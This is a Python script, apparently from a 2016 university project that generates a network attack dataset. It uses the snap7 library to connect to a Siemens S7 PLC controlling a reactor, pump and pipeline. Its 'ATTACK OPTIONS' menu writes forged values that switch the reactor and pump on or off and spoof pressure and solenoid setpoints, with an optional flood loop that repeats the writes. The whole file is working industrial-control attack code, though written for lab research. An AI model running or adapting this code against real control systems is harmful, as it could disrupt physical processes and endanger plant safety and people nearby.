#Daniel J. Cowdery - 2016
#IFN701 - Network Attack Dataset (Masquerading Attack)

import snap7
import snap7.partner
from snap7.snap7types import*
from snap7.snap7exceptions import*
from snap7.util import*

import time


class Reactor:

    def __init__(self):
        self.client = snap7.client.Client()
        self.IP = "10.10.10.12"
        self.run = True
        self.option = 99
        self.flood = False
        self.restart = False
        self.hexData = [0] * 11
        self.oldHex = [0] * 11
        self.readValue = [0] * 11
        self.changed = False
        self.changedFlood = False
        self.client.connect(self.IP, 0, 1)
        print "Connected to Reactor"


    def CheckStatus(self):
        # Read current status
        self.hexData[0] = self.client.read_area(S7AreaMK, 0, 1, 4)  # Reactor/Solenoid On
        self.hexData[1] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Reactor/Solenoid Off
        self.hexData[2] = self.client.read_area(S7AreaMK, 0, 17, 4)  # Pipeline Pressure Scaled
        self.hexData[3] = self.client.read_area(S7AreaMK, 0, 21, 4)  # Pipeline Pressure Normal
        self.hexData[4] = self.client.read_area(S7AreaMK, 0, 9, 4)  # Pump On
        self.hexData[5] = self.client.read_area(S7AreaMK, 0, 13, 4)  # Pump Off


        self.hexData[6] = self.client.read_area(S7AreaPA, 0, 0, 1)  # Pump Run CMD
        self.hexData[7] = self.client.read_area(S7AreaMK, 0, 0, 1)  # Reactor/Solenoid Mode
        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 1, 1)  # Pump Mode
        self.hexData[9] = self.client.read_area(S7AreaPA, 0, 1, 1)  # Reactor/Solenoid Open CMD

        self.hexData[10] = self.client.read_area(S7AreaPE, 0, 0, 1)     #Power OK



        # Convert Hexadecimal ByteArray to variables
        self.readValue[0] = snap7.util.get_real(self.hexData[0], 0)         # Reactor/Solenoid On
        self.readValue[1] = snap7.util.get_real(self.hexData[1], 0)         # Reactor/Solenoid Off
        self.readValue[2] = snap7.util.get_real(self.hexData[2], 0)         # Pipeline Pressure Scaled
        self.readValue[3] = snap7.util.get_real(self.hexData[3], 0)         # Pipeline Pressure Normal
        self.readValue[4] = snap7.util.get_bool(self.hexData[4], 0, 0)      # Pump On       #Last value may need to be 1
        self.readValue[5] = snap7.util.get_bool(self.hexData[5], 0, 0)      # Pump Off      #Last value may need to be 1


        self.readValue[6] = snap7.util.get_bool(self.hexData[6], 0, 0)      # Pump Run CMD              #Last value may need to be 1
        self.readValue[7] = snap7.util.get_bool(self.hexData[7], 0, 0)      # Reactor/Solenoid Mode     #Last value may need to be 1
        self.readValue[8] = snap7.util.get_bool(self.hexData[8], 0, 0)      # Pump Mode                 #Last value may need to be 1
        self.readValue[9] = snap7.util.get_bool(self.hexData[9], 0, 1)      # Reactor/Solenoid Open CMD

        self.readValue[10] = snap7.util.get_bool(self.hexData[10], 0, 0)    # Power OK

        # self.CompareStatus()






    def PrintStatus(self):
        print "\nREACTOR STATUS"
        # print "CPU Info: ", self.client.get_cpu_info()
        # self.client.db_write()
        print "CPU State: ", self.client.get_cpu_state()
        print "Reactor / Solenoid On: ", self.readValue[0]
        print "Reactor / Solenoid Off: ", self.readValue[1]
        print "Pipeline Pressure Scaled: ", self.readValue[2]
        print "Pipeline Pressure Normal: ", self.readValue[3]
        print "Pump On: ", self.readValue[4]
        print "Pump Off: ", self.readValue[5]
        print "Pump Run CMD: ", self.readValue[6]
        print "Reactor / Solenoid Mode: ", self.readValue[7]
        print "Pump Mode: ", self.readValue[8]
        print "Reactor / Solenoid Open CMD: ", self.readValue[9]
        print "Power OK: ", self.readValue[10]


    def PrintOptions(self):
        print "\nATTACK OPTIONS"
        print "0:   Turn Reactor On"
        print "1:   Turn Reactor Off"
        print "2:   Set New Scaled Pressure Value"
        print "3:   Set New Solenoid On Value"
        print "99:  Display System Status"

        try:
            self.option = int(raw_input("\nSelect an action to perform... "))
            self.changed = False
        except ValueError:
            print "Please enter a valid number\n"

        self.FloodToggle()


    def FloodToggle(self):
        self.changedFlood = False
        if self.option != 99:
            try:
                while not self.changedFlood:
                    ans = raw_input("\nFlood? [Y/N] ")
                    if ans == "Y" or ans == "y":
                        self.flood = True
                        self.changedFlood = True
                    elif ans == "N" or ans == "n":
                        self.flood = False
                        self.changedFlood = True
                    else:
                        print "Please enter a valid option \n"
            except KeyboardInterrupt:
                self.PrintOptions()


    def LaunchAttack(self):
        if self.option == 0:
            self.ReactorOn()

        if self.option == 1:
            self.ReactorOff()

        elif self.option == 2:
            self.ChangeScaledPressure()

        elif self.option == 3:
            self.ChangeSolenoidOn()

        elif self.option == 99:
            self.PrintStatus()



    def ReactorOn(self):
        try:
            if self.flood:
                while self.flood:  # Always true if flooding
                    print "Turning Reactor On..."
                    #snap7.util.set_bool(self.hexData[6], 0, 1, True)                # Pump Run CMD = True
                    snap7.util.set_bool(self.hexData[7], 0, 1, False)                # Reactor/Solenoid Mode     #Last value may need to be 1
                    snap7.util.set_bool(self.hexData[8], 0, 1, True)                # Pump Mode                 #Last value may need to be 1
                    #snap7.util.set_bool(self.hexData[10], 0, 1, True)               #Power OK


                    #self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
                    self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])         # Reactor/Solenoid Mode
                    self.client.write_area(S7AreaMK, 0, 100, self.hexData[8])         # Pump Mode
                    #self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])        # Power OK


            else:
                print "Turning Reactor On..."
                #snap7.util.set_bool(self.hexData[6], 0, 1, True)  # Pump Run CMD = True
                snap7.util.set_bool(self.hexData[7], 0, 1, False)  # Reactor/Solenoid Mode     #Last value may need to be 1
                snap7.util.set_bool(self.hexData[8], 0, 1, True)  # Pump Mode                 #Last value may need to be 1
                #snap7.util.set_bool(self.hexData[10], 0, 1, True)  # Power OK

                #self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
                self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])  # Reactor/Solenoid Mode
                #self.client.write_area(S7AreaMK, 0, 100, self.hexData[8])  # Pump Mode
                #self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])  # Power OK

        except KeyboardInterrupt:
                self.restart = True


    def ReactorOff(self):
        try:
            if self.flood:
                while self.flood:  # Always true if flooding
                    print "Turning Reactor Off..."
                    snap7.util.set_bool(self.hexData[6], 0, 0, False)                # Pump Run CMD = True
                    snap7.util.set_bool(self.hexData[7], 0, 0, False)                # Reactor/Solenoid Mode     #Last value may need to be 1
                    snap7.util.set_bool(self.hexData[8], 0, 0, False)                # Pump Mode                 #Last value may need to be 1
                    snap7.util.set_bool(self.hexData[10], 0, 0, False)               #Power OK


                    self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
                    self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])         # Reactor/Solenoid Mode
                    self.client.write_area(S7AreaMK, 0, 1, self.hexData[8])         # Pump Mode
                    self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])        # Power OK

            else:
                print "Turning Reactor Off..."
                snap7.util.set_bool(self.hexData[6], 0, 0, False)  # Pump Run CMD = True
                snap7.util.set_bool(self.hexData[7], 0, 0, False)  # Reactor/Solenoid Mode     #Last value may need to be 1
                snap7.util.set_bool(self.hexData[8], 0, 0, False)  # Pump Mode                 #Last value may need to be 1
                snap7.util.set_bool(self.hexData[10], 0, 0, False)  # Power OK

                self.client.write_area(S7AreaPA, 0, 0, self.hexData[6])
                self.client.write_area(S7AreaMK, 0, 0, self.hexData[7])  # Reactor/Solenoid Mode
                self.client.write_area(S7AreaMK, 0, 1, self.hexData[8])  # Pump Mode
                self.client.write_area(S7AreaPE, 0, 0, self.hexData[10])  # Power OK

        except KeyboardInterrupt:
            self.restart = True


    def ChangeScaledPressure(self):
        try:
            value = float(input("\nPlease enter scaled pressure value... "))
            if self.flood:
                while self.flood:
                    print "Changing pressure value to ", value
                    snap7.util.set_real(self.hexData[2], 0, value)  # Pipeline Pressure Scaled
                    self.client.write_area(S7AreaMK, 0, 17, self.hexData[2])  # Pipeline Pressure Scaled

            else:
                print "Changing pressure value to ", value
                snap7.util.set_real(self.hexData[2], 0, value)  # Pipeline Pressure Scaled
                self.client.write_area(S7AreaMK, 0, 17, self.hexData[2])  # Pipeline Pressure Scaled

        except KeyboardInterrupt:
            self.restart = True


    def ChangeSolenoidOn(self):
        try:
            value = float(input("\nPlease enter new solenoid on value... "))
            if self.flood:
                while self.flood:
                    print "Changing solenoid on value to ", value
                    snap7.util.set_real(self.hexData[0], 0, value)      # Reactor/Solenoid On
                    self.client.write_area(S7AreaMK, 0, 1, self.hexData[0])  # Reactor/Solenoid On

            else:
                print "Changing 'solenoid on' value to ", value
                snap7.util.set_real(self.hexData[0], 0, value)  # Reactor/Solenoid On
                self.client.write_area(S7AreaMK, 0, 1, self.hexData[0])  # Reactor/Solenoid On


        except KeyboardInterrupt:
            self.restart = True